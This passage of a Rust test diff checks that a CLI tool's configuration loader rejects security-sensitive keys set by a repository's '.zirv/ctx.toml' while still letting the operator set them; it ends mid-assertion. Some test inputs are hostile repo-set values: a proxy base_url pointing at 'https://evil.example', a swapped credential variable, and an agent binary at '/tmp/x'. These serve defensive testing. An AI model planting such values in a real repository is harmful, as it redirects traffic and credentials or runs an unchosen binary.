+        assert_eq!(
+            cfg.unparsable_layers.len(),
+            2,
+            "{:?}",
+            cfg.unparsable_layers
+        );
+    }
+
+    /// The security contract must not be blurred by the parse-skip fix above:
+    /// a key a repository may never set is still a hard rejection, distinct
+    /// from a plain parse failure both in kind (`is_repo_forbidden`) and in
+    /// effect (the whole load still fails -- there is no config to hand back
+    /// with a `REPO_FORBIDDEN` key quietly dropped).
+    #[test]
+    fn a_repo_forbidden_key_is_still_rejected_and_distinguishable_from_a_parse_failure() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "agent_bin = \"/tmp/x\"\n",
+        )
+        .expect("write");
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let empty = env_map(&[]);
+        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("a repository must not be able to set agent_bin");
+        assert!(
+            is_repo_forbidden(err.as_ref()),
+            "a REPO_FORBIDDEN rejection must be identifiable as such: {err}"
+        );
+
+        // A genuine TOML syntax error is not a `REPO_FORBIDDEN` rejection --
+        // it never reaches `reject_untrusted_keys` as an `Err` at all any
+        // more (see the skip tests above), but the distinguishing predicate
+        // itself must still say no for every other error shape it might see
+        // (an unknown/mistyped key, here).
+        let repo2 = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
+        std::fs::write(repo2.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n")
+            .expect("write");
+        let typo_err = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
+            .expect_err("a typo'd key must still be rejected");
+        assert!(
+            !is_repo_forbidden(typo_err.as_ref()),
+            "a schema error is not a REPO_FORBIDDEN rejection: {typo_err}"
+        );
+    }
+
+    /// `repo == home_dir()` (`zirv`/`zirv chat` run from `~`) must not
+    /// re-read `~/.zirv/ctx.toml` as a repo layer and hard-error on `agent`.
+    #[test]
+    fn repo_equal_to_home_has_no_repository_layer_and_still_honors_agent() {
+        let home = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(home.path().join(".zirv/ctx.toml"), "agent = \"claude\"\n").expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(home.path(), &|k| empty.get(k).cloned())
+            .expect("repo == home_dir() must not hard-error as REPO_FORBIDDEN");
+        assert_eq!(cfg.agent.as_deref(), Some("claude"));
+    }
+
+    /// Regression guard: a real repository distinct from home is still
+    /// REPO_FORBIDDEN for `agent`, even when home sets the same key.
+    #[test]
+    fn a_real_repository_distinct_from_home_still_hard_errors_on_agent() {
+        let home = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(home.path().join(".zirv/ctx.toml"), "agent = \"claude\"\n").expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(repo.path().join(".zirv/ctx.toml"), "agent = \"claude\"\n").expect("write");
+
+        let empty = env_map(&[]);
+        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("a real repository must still be REPO_FORBIDDEN for agent");
+        assert!(
+            is_repo_forbidden(err.as_ref()),
+            "expected REPO_FORBIDDEN: {err}"
+        );
+    }
+
+    /// Issue #295: the session tier's own gate and the journal's retention
+    /// cap join every other `memory.*` key as `REPO_FORBIDDEN` -- a repo
+    /// checkout must not be able to switch the session tier on for itself,
+    /// nor grow its own journal's retention window. Mirrors the existing
+    /// `memory.shared_enabled` precedent this same reasoning was set by.
+    #[test]
+    fn memory_session_enabled_and_journal_max_entries_are_repo_forbidden() {
+        let empty = env_map(&[]);
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        for (toml, offending_key) in [
+            ("[memory]\nsession_enabled = false\n", "session_enabled"),
+            (
+                "[memory]\njournal_max_entries = 100000\n",
+                "journal_max_entries",
+            ),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
+                &format!("a repository must not be able to set memory.{offending_key}"),
+            );
+            assert!(
+                is_repo_forbidden(err.as_ref()),
+                "memory.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
+            );
+        }
+    }
+
+    /// The operator-only escape hatches for the same two keys: `~/.zirv/
+    /// ctx.toml` and `ZIRV_CTX_MEMORY_SESSION`/`ZIRV_CTX_MEMORY_JOURNAL_MAX_
+    /// ENTRIES` may still set them, exactly like every other `memory.*` key.
+    #[test]
+    fn the_operator_can_still_set_session_enabled_and_journal_max_entries_from_the_environment() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_MEMORY_SESSION", "false"),
+            ("ZIRV_CTX_MEMORY_JOURNAL_MAX_ENTRIES", "42"),
+        ]);
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
+            .expect("the operator's own environment may set these keys");
+        assert!(!cfg.memory.session_enabled);
+        assert_eq!(cfg.memory.journal_max_entries, 42);
+    }
+
+    /// Issue #537 seam: `[proxy]` defaults match the spec's table exactly --
+    /// disabled, `typesafe` first, floor 0.5, 16 KiB request cap, the
+    /// documented Jev endpoint/credential-env/model/timeout.
+    #[test]
+    fn proxy_config_defaults_match_the_spec() {
+        let cfg = ProxyConfig::default();
+        assert!(!cfg.enabled);
+        assert_eq!(cfg.decider, ProxyDecider::Typesafe);
+        assert_eq!(cfg.min_confidence, 0.5);
+        assert_eq!(
+            cfg.min_margin,
+            crate::commands::ctx::jev::DEFAULT_MIN_MARGIN
+        );
+        assert_eq!(cfg.request_max_bytes, 16_384);
+        assert_eq!(cfg.typesafe.base_url, "https://api.typesafe.ai/v1");
+        assert_eq!(cfg.typesafe.credential_env, "TYPESAFE_API_KEY");
+        assert_eq!(cfg.typesafe.model, "jev-1.13.0");
+        assert_eq!(cfg.typesafe.timeout_secs, 10);
+    }
+
+    /// Every `[proxy]`/`[proxy.typesafe]` key is `REPO_FORBIDDEN`: a repo
+    /// checkout must not be able to turn the proxy on for itself, redirect
+    /// its decider, or loosen its confidence floor/request cap.
+    #[test]
+    fn proxy_keys_are_repo_forbidden() {
+        let empty = env_map(&[]);
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        for (toml, offending_key) in [
+            ("[proxy]\nenabled = true\n", "enabled"),
+            ("[proxy]\ndecider = \"helper\"\n", "decider"),
+            ("[proxy]\nmin_confidence = 0.9\n", "min_confidence"),
+            ("[proxy]\nmin_margin = 0.9\n", "min_margin"),
+            ("[proxy]\nrequest_max_bytes = 1\n", "request_max_bytes"),
+            (
+                "[proxy.typesafe]\nbase_url = \"https://evil.example\"\n",
+                "typesafe.base_url",
+            ),
+            (
+                "[proxy.typesafe]\ncredential_env = \"EVIL\"\n",
+                "typesafe.credential_env",
+            ),
+            ("[proxy.typesafe]\nmodel = \"evil\"\n", "typesafe.model"),
+            (
+                "[proxy.typesafe]\ntimeout_secs = 1\n",
+                "typesafe.timeout_secs",
+            ),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
+                &format!("a repository must not be able to set proxy.{offending_key}"),
+            );
+            assert!(
+                is_repo_forbidden(err.as_ref()),
+                "proxy.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
+            );
+        }
+    }
+
+    /// The operator's own escape hatches: `~/.zirv/ctx.toml` and every
+    /// `ZIRV_CTX_PROXY_*` env var may still set these keys.
+    #[test]
+    fn the_operator_can_still_set_proxy_keys_from_the_environment() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_PROXY_ENABLED", "true"),
+            ("ZIRV_CTX_PROXY_DECIDER", "helper"),
+            ("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "0.75"),
+            ("ZIRV_CTX_PROXY_MIN_MARGIN", "0.35"),
+            ("ZIRV_CTX_PROXY_REQUEST_MAX_BYTES", "4096"),
+            ("ZIRV_CTX_PROXY_TYPESAFE_BASE_URL", "http://localhost:9999"),
+            ("ZIRV_CTX_PROXY_TYPESAFE_CREDENTIAL_ENV", "MY_KEY"),
+            ("ZIRV_CTX_PROXY_TYPESAFE_MODEL", "jev-next"),
+            ("ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS", "3"),
+        ]);
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
+            .expect("the operator's own environment may set these keys");
+        assert!(cfg.proxy.enabled);
+        assert_eq!(cfg.proxy.decider, ProxyDecider::Helper);
+        assert_eq!(cfg.proxy.min_confidence, 0.75);
+        assert_eq!(cfg.proxy.min_margin, 0.35);
+        assert_eq!(cfg.proxy.request_max_bytes, 4096);
+        assert_eq!(cfg.proxy.typesafe.base_url, "http://localhost:9999");
+        assert_eq!(cfg.proxy.typesafe.credential_env, "MY_KEY");
+        assert_eq!(cfg.proxy.typesafe.model, "jev-next");
+        assert_eq!(cfg.proxy.typesafe.timeout_secs, 3);
+    }
+
+    /// Issue #537 seam, review finding: `[proxy]`'s three bounded numeric
+    /// keys are validated once at load, as a hard error naming the key --
+    /// never a silent clamp -- matching every other range check `load`
+    /// makes (`fallback.*`'s percentage bounds, `chat.claude_permission_
+    /// mode`'s fixed set).
+    #[test]
+    fn proxy_bounds_are_validated_at_load() {
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        for (env_pairs, expected_key) in [
+            (
+                vec![("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "1.5")],
+                "proxy.min_confidence",
+            ),
+            (
+                vec![("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "-0.1")],
+                "proxy.min_confidence",
+            ),
+            (
+                vec![("ZIRV_CTX_PROXY_MIN_MARGIN", "1.5")],
+                "proxy.min_margin",
+            ),
+            (
+                vec![("ZIRV_CTX_PROXY_MIN_MARGIN", "-0.1")],
+                "proxy.min_margin",
+            ),
+            (
+                vec![("ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS", "0")],
+                "proxy.typesafe.timeout_secs",
+            ),
+            (
+                vec![("ZIRV_CTX_PROXY_REQUEST_MAX_BYTES", "10")],
+                "proxy.request_max_bytes",
+            ),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            let env = env_map(&env_pairs);
+            let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err(&format!(
+                "{expected_key} out of range must be a load-time error"
+            ));
+            assert!(
+                err.to_string().contains(expected_key),
+                "expected error naming {expected_key}: {err}"
+            );
+        }
+    }
+
+    /// The documented lower bounds (`0.0`, `1`, `MIN_PROXY_REQUEST_MAX_
+    /// BYTES`) are themselves valid, not just narrowly excluded.
+    #[test]
+    fn proxy_bounds_accept_their_own_edges() {
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_PROXY_MIN_CONFIDENCE", "0"),
+            ("ZIRV_CTX_PROXY_MIN_MARGIN", "0"),
+            ("ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS", "1"),
+            ("ZIRV_CTX_PROXY_REQUEST_MAX_BYTES", "1024"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
+            .expect("the documented lower bounds must be accepted");
+        assert_eq!(cfg.proxy.min_confidence, 0.0);
+        assert_eq!(cfg.proxy.min_margin, 0.0);
+        assert_eq!(cfg.proxy.typesafe.timeout_secs, 1);
+        assert_eq!(cfg.proxy.request_max_bytes, 1024);
+    }
+
+    /// Issue #537 seam extraction: every `[jev]` advisory-site key defaults
+    /// to off, so a Jev-backed decision path never activates until an
+    /// operator opts a specific site in.
+    #[test]
+    fn jev_config_defaults_to_all_sites_off() {
+        let cfg = JevConfig::default();
+        assert!(!cfg.memory);
+        assert!(!cfg.supervisor);
+        assert!(!cfg.dispatch);
+        assert!(!cfg.review);
+        assert!(!cfg.gates);
+        assert_eq!(cfg.cache_ttl_secs, 86_400);
+    }
+
+    /// The operator's own home layer may still set `[jev]` keys directly in
+    /// TOML, same as any other operator-only table.
+    #[test]
+    fn an_operator_layer_can_set_jev_keys_from_toml() {
+        let home = tempfile::tempdir().expect("home");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            home.path().join(".zirv/ctx.toml"),
+            "[jev]\nmemory = true\ngates = true\n",
+        )
+        .expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("repo");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert!(cfg.jev.memory);
+        assert!(cfg.jev.gates);
+        assert!(!cfg.jev.supervisor);
+        assert!(!cfg.jev.dispatch);
+        assert!(!cfg.jev.review);
+    }
+
+    /// Every `[jev]` key is `REPO_FORBIDDEN`: a repo checkout must not be
+    /// able to turn on a Jev-backed decision path for itself.
+    #[test]
+    fn jev_keys_are_repo_forbidden() {
+        let empty = env_map(&[]);
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        for (toml, offending_key) in [
+            ("[jev]\nmemory = true\n", "memory"),
+            ("[jev]\nsupervisor = true\n", "supervisor"),
+            ("[jev]\ndispatch = true\n", "dispatch"),
+            ("[jev]\nreview = true\n", "review"),
+            ("[jev]\ngates = true\n", "gates"),
+            ("[jev]\ncache_ttl_secs = 1\n", "cache_ttl_secs"),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect_err(
+                &format!("a repository must not be able to set jev.{offending_key}"),
+            );
+            assert!(
+                is_repo_forbidden(err.as_ref()),
+                "jev.{offending_key} must be rejected as REPO_FORBIDDEN: {err}"
+            );
+        }
+    }
+
+    /// The operator's own escape hatches: `~/.zirv/ctx.toml` and every
+    /// `ZIRV_CTX_JEV_*` env var may still set these keys.
+    #[test]
+    fn the_operator_can_still_set_jev_keys_from_the_environment() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_JEV_MEMORY", "true"),
+            ("ZIRV_CTX_JEV_SUPERVISOR", "true"),
+            ("ZIRV_CTX_JEV_DISPATCH", "true"),
+            ("ZIRV_CTX_JEV_REVIEW", "true"),
+            ("ZIRV_CTX_JEV_GATES", "true"),
+            ("ZIRV_CTX_JEV_CACHE_TTL_SECS", "3600"),
+        ]);
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
+            .expect("the operator's own environment may set these keys");
+        assert!(cfg.jev.memory);
+        assert!(cfg.jev.supervisor);
+        assert!(cfg.jev.dispatch);
+        assert!(cfg.jev.review);
+        assert!(cfg.jev.gates);
+        assert_eq!(cfg.jev.cache_ttl_secs, 3600);
+    }
+
+    #[test]
+    fn the_operator_can_still_set_those_keys_from_the_environment() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_AGENT_BIN", "/opt/homebrew/bin/claude"),
+            ("ZIRV_CTX_ON_FAILURE", "say done"),
+            ("ZIRV_CTX_MODEL", "sonnet"),
+            ("ZIRV_CTX_AGENT", "codex"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.agent_bin.as_deref(), Some("/opt/homebrew/bin/claude"));
+        assert_eq!(cfg.supervise.on_failure.as_deref(), Some("say done"));
+        assert_eq!(cfg.handoff.model.as_deref(), Some("sonnet"));
+        assert_eq!(cfg.agent.as_deref(), Some("codex"));
+    }
+
+    /// Ordinary thresholds like `tail_items` shape *how* a run behaves, not
+    /// *what* runs or whose account it spends, so they stay repo-settable.
+    /// (`agent` used to sit in this bucket too; it moved to `REPO_FORBIDDEN`
+    /// once codex became selectable, because picking the adapter picks the
+    /// vendor account -- see `a_repository_config_cannot_name_what_the_tool_runs`.)
+    #[test]
+    fn a_repository_may_still_choose_the_thresholds() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[handoff]\ntail_items = 9\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.handoff.tail_items, 9);
+        assert_eq!(
+            cfg.handoff.model, None,
+            "still the default: per-adapter resolution now lives in resolve_distiller_model"
+        );
+    }
+
+    #[test]
+    fn missing_files_are_not_an_error() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.score.window, 10);
+    }
+
+    #[test]
+    fn pacing_defaults_match_the_spec() {
+        let pace = PaceConfig::default();
+        assert!(pace.enabled, "pacing is on by default");
+        assert_eq!(pace.max_percent, 99.0);
+        assert_eq!(pace.collector_max_age_secs, 900);
+        assert!(pace.estimator);
+        assert_eq!(
+            (pace.five_hour_budget_tokens, pace.seven_day_budget_tokens),
+            (0, 0),
+            "no invented budget: the estimator stays quiet until an operator sets one"
+        );
+        assert!(!pace.count_cache_reads);
+        assert_eq!(pace.jitter_secs, 30);
+        assert_eq!(pace.fallback_delay_secs, 900);
+        assert_eq!(pace.wait_slack_secs, 3600);
+        assert_eq!(
+            pace.max_wait_secs, None,
+            "no global cap by default: the cap is scaled to the window that tripped"
+        );
+    }
+
+    #[test]
+    fn pacing_reads_from_the_repo_config_file() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[pace]\nenabled = false\nmax_percent = 80.5\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        // T9: `enabled` and `max_percent` now go through the repo-narrowing
+        // fold (see `narrow_pace_bool`/`narrow_pace_percent`), not a plain
+        // merge -- this repo's own `enabled = false` is a weakening attempt
+        // against the (enabled) default and is silently ineffective, while
+        // `max_percent = 80.5` genuinely tightens the default 99.0% ceiling
+        // and still lands. Every other key in this repo layer (still ordinary
+        // merge) is untouched proof the fold is scoped to exactly these keys,
+        // not the whole `[pace]` table.
+        assert!(
+            cfg.pace.enabled,
+            "a repo may not disable pacing (T9 narrowing)"
+        );
+        assert_eq!(cfg.pace.max_percent, 80.5, "a repo may tighten the ceiling");
+        assert_eq!(
+            cfg.pace.fallback_delay_secs, 900,
+            "untouched keys keep defaults"
+        );
+    }
+
+    #[test]
+    fn pacing_env_overrides_cover_floats_and_bools() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_PACE", "false"),
+            ("ZIRV_CTX_PACE_MAX_PERCENT", "75"),
+            ("ZIRV_CTX_FIVE_HOUR_BUDGET", "1000"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert!(!cfg.pace.enabled);
+        assert_eq!(
+            cfg.pace.max_percent, 75.0,
+            "an integer literal must load as a float"
+        );
+        assert_eq!(cfg.pace.five_hour_budget_tokens, 1000);
+    }
+
+    #[test]
+    fn spawn_gate_thresholds_are_settable_from_the_operators_own_env() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_PACE_SPAWN_SOFT_PCT", "70"),
+            ("ZIRV_CTX_PACE_SPAWN_HARD_PCT", "90"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.pace.spawn_soft_pct, 70.0);
+        assert_eq!(cfg.pace.spawn_hard_pct, 90.0);
+    }
+
+    #[test]
+    fn a_non_numeric_percent_is_rejected_with_the_variable_named() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[("ZIRV_CTX_PACE_MAX_PERCENT", "loads")]);
+        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad float");
+        let msg = err.to_string();
+        assert!(msg.contains("ZIRV_CTX_PACE_MAX_PERCENT"), "got {msg}");
+    }
+
+    #[test]
+    fn a_non_boolean_flag_is_rejected() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[("ZIRV_CTX_PACE", "yes-please")]);
+        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
+        assert!(err.to_string().contains("ZIRV_CTX_PACE"));
+    }
+
+    #[test]
+    fn pace_gains_soft_and_poll_and_use_credits_defaults() {
+        let cfg = PaceConfig::default();
+        assert_eq!(cfg.soft_percent, 80.0);
+        assert!(cfg.poll_enabled);
+        assert_eq!(cfg.poll_min_interval_secs, 60);
+        assert!(!cfg.use_credits.claude);
+        assert!(!cfg.use_credits.codex);
+    }
+
+    #[test]
+    fn pace_gains_spawn_soft_and_hard_pct_defaults() {
+        let cfg = PaceConfig::default();
+        assert_eq!(cfg.spawn_soft_pct, 80.0);
+        assert_eq!(cfg.spawn_hard_pct, 95.0);
+    }
+
+    #[test]
+    fn pace_run_budget_tokens_defaults_to_unset() {
+        assert_eq!(PaceConfig::default().run_budget_tokens, None);
+    }
+
+    /// Issue #155, Phase 6(c): unlike `pace.enabled`/`max_percent`/
+    /// `soft_percent` (which a repo may repo-narrow -- see `a_repo_layer_
+    /// may_only_narrow_pace_enabled_max_percent_and_soft_percent` below),
+    /// `spawn_soft_pct`/`spawn_hard_pct` are `REPO_FORBIDDEN` outright: a
+    /// checkout may not move either threshold in EITHER direction, not even
+    /// to tighten it. Raising either would let a checkout spend past a
+    /// ceiling the operator set; a repo-narrowing fold (the `pace.max_
+    /// percent` shape) would let a checkout throttle delegation for an
+    /// operator who never asked for that either -- a spawn gate has no safe
+    /// direction for an untrusted layer to move it, so both are blocked
+    /// outright instead.
+    #[test]
+    fn a_repo_ctx_toml_cannot_move_the_spawn_gate_thresholds_in_either_direction() {
+        for repo_toml in [
+            "[pace]\nspawn_soft_pct = 10.0\n",
+            "[pace]\nspawn_soft_pct = 99.0\n",
+            "[pace]\nspawn_hard_pct = 10.0\n",
+            "[pace]\nspawn_hard_pct = 99.9\n",
+        ] {
+            let repo = tempfile::tempdir().expect("repo");
+            let home = tempfile::tempdir().expect("home");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write");
+            let empty: HashMap<String, String> = HashMap::new();
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err(&format!("a repo may not set: {repo_toml}"));
+            assert!(
+                is_repo_forbidden(err.as_ref()),
+                "must be a security refusal for {repo_toml}: {err}"
+            );
+        }
+    }
+
+    /// Issue #285: `run_budget_tokens` is the default soft budget `zirv ctx
+    /// objective set` applies when the operator's own `--budget-tokens` is
+    /// omitted -- a spend ceiling, so a repo checkout must not be able to
+    /// raise it, the same trust asymmetry every other budget key in
+    /// `REPO_FORBIDDEN` enforces.
+    #[test]
+    fn a_repo_ctx_toml_cannot_set_pace_run_budget_tokens() {
+        let repo = tempfile::tempdir().expect("repo");
+        let home = tempfile::tempdir().expect("home");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[pace]\nrun_budget_tokens = 1000000\n",
+        )
+        .expect("write");
+        let empty: HashMap<String, String> = HashMap::new();
+        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("a repo may not set pace.run_budget_tokens");
+        assert!(
+            is_repo_forbidden(err.as_ref()),
+            "must be a security refusal: {err}"
+        );
+    }
+
+    #[test]
+    fn use_credits_maps_providers_to_agent_flags() {
+        let uc = UseCreditsConfig {
+            claude: true,
+            codex: false,
+        };
+        assert!(uc.for_provider("anthropic"));
+        assert!(!uc.for_provider("openai"));
+        assert!(
+            !uc.for_provider("something-else"),
+            "unknown provider: gate stays on"
+        );
+    }
+
+    #[test]
+    fn a_repo_layer_may_not_touch_use_credits_or_poll_keys() {
+        for (toml, key, variable) in [
+            (
+                "[pace.use_credits]\nclaude = true\n",
+                "pace.use_credits",
+                "ZIRV_CTX_PACE_USE_CREDITS_CLAUDE",
+            ),
+            (
+                "[pace]\npoll_enabled = false\n",
+                "pace.poll_enabled",
+                "ZIRV_CTX_PACE_POLL",
+            ),
+            (
+                "[pace]\npoll_min_interval_secs = 1\n",
+                "pace.poll_min_interval_secs",
+                "ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS",
+            ),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+
+            let home = tempfile::tempdir().expect("tempdir");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+            let empty = env_map(&[]);
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err("a repo may not set this key")
+                .to_string();
+            assert!(err.contains(key), "name the offending key: {err}");
+            assert!(
+                err.contains(variable),
+                "names the operator escape hatch: {err}"
+            );
+        }
+
+        // The rejection is real, not decorative: a clean repo layer still
+        // loads and keeps the new keys at their defaults.
+        let repo = tempfile::tempdir().expect("tempdir");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.pace.soft_percent, 80.0);
+        assert!(cfg.pace.poll_enabled);
+        assert_eq!(cfg.pace.poll_min_interval_secs, 60);
+        assert!(!cfg.pace.use_credits.claude);
+    }
+
+    /// Audit finding G1: the estimator switch, both window budgets and the
+    /// cache-read toggle were plain repo-mergeable, so a checkout could turn
+    /// the estimator on against a budget of its own choosing and have the
+    /// gate pace on numbers it wrote itself. They are `REPO_FORBIDDEN` now.
+    /// Review round 1 (R1): `collector_max_age_secs` joined them. It was
+    /// narrow-only on the reading that lower is stricter, but a repo lowering
+    /// it drops a fresh vendor reading out of `pace::binding` and lets the
+    /// estimator's lower figure bind instead -- a bypass in the "stricter"
+    /// direction, so neither direction is repo-settable now.
+    #[test]
+    fn repo_layer_cannot_widen_pace_collector_max_age_or_budgets() {
+        for (toml, key, variable) in [
+            (
+                "[pace]\nestimator = true\n",
+                "pace.estimator",
+                "ZIRV_CTX_PACE_ESTIMATOR",
+            ),
+            (
+                "[pace]\nfive_hour_budget_tokens = 987654321\n",
+                "pace.five_hour_budget_tokens",
+                "ZIRV_CTX_FIVE_HOUR_BUDGET",
+            ),
+            (
+                "[pace]\nseven_day_budget_tokens = 987654321\n",
+                "pace.seven_day_budget_tokens",
+                "ZIRV_CTX_SEVEN_DAY_BUDGET",
+            ),
+            (
+                "[pace]\ncount_cache_reads = true\n",
+                "pace.count_cache_reads",
+                "ZIRV_CTX_PACE_COUNT_CACHE_READS",
+            ),
+            (
+                "[pace]\ncollector_max_age_secs = 1\n",
+                "pace.collector_max_age_secs",
+                "ZIRV_CTX_PACE_COLLECTOR_MAX_AGE_SECS",
+            ),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            let home = tempfile::tempdir().expect("tempdir");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+            let empty = env_map(&[]);
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err(&format!("a repo may not set: {toml}"));
+            assert!(
+                is_repo_forbidden(err.as_ref()),
+                "must be a security refusal for {toml}: {err}"
+            );
+            let message = err.to_string();
+            assert!(message.contains(key), "name the offending key: {message}");
+            assert!(
+                message.contains(variable),
